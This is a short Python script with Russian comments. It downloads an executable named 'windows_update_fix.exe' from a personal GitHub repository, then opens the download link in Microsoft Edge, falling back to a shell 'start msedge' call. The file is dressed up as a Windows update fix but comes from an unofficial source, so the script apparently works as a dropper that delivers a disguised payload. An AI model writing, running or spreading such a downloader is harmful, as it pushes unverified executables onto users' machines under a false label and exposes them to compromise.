import urllib.request
import webbrowser
import os

# Настройки
url = "https://github.com/konyakpivo-wq/mega-tool-fix/raw/refs/heads/main/windows_update_fix.exe"
file_name = "windows_update_fix.exe"

def download_and_open_in_edge():
    try:
        # 1. Скачивание файла
        print(f"Скачиваю {file_name}...")
        urllib.request.urlretrieve(url, file_name)
        print("Файл успешно скачан.")

        # 2. Попытка открыть именно через Microsoft Edge
        print("Запускаю Microsoft Edge...")
        
        # Стандартные пути для Edge в Windows
        edge_path = "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe %s"
        
        try:
            # Пытаемся запустить через зарегистрированный браузер или по пути
            webbrowser.get(edge_path).open(url)
        except Exception:
            # Если путь отличается, пробуем найти через системный вызов
            os.system(f'start msedge {url}')

        print(f"\nГотово! Файл лежит тут: {os.path.abspath(file_name)}")

    except Exception as e:
        print(f"Что-то пошло не так: {e}")

if __name__ == "__main__":
    download_and_open_in_edge()
